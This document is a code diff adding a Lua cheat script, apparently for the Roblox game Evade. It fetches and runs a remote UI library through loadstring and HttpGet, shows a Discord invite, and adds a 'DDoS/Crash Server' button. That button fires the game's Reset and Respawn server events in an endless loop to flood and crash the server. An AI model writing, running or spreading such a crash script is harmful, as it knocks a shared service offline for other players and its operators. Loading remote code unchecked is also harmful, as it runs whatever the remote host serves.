@@ -1,0 +1,39 @@
+local Library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local wxbhub_evade = Library:MakeWindow({Name = "WxbHub / Evade", HidePremium = false, SaveConfig = true, ConfigFolder = "WxbHub", IntroEnabled = "true", IntroText = "Evade script v1"})
+
+-- Info
+local Info = wxbhub_evade:MakeTab({
+	Name = "Info",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local hubinfo1 = Info:AddSection({
+	Name = "> WxbHub for Evade"
+})
+
+local hubinfo2 = Info:AddSection({
+	Name = "> Our discord server: https://discord.gg/JkXj6zZmB8"
+})
+
+--Server
+local Server = wxbhub_evade:MakeTab({
+	Name = "Server",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local function crasher()
+    while wait() do
+        game:GetService("ReplicatedStorage").Events.Reset:FireServer()
+        game:GetService("ReplicatedStorage").Events.Respawn:FireServer()
+    end
+end
+
+Server:AddButton({
+	Name = "DDoS/Crash Server",
+	Callback = function()
+        crasher()
+  	end    
+})
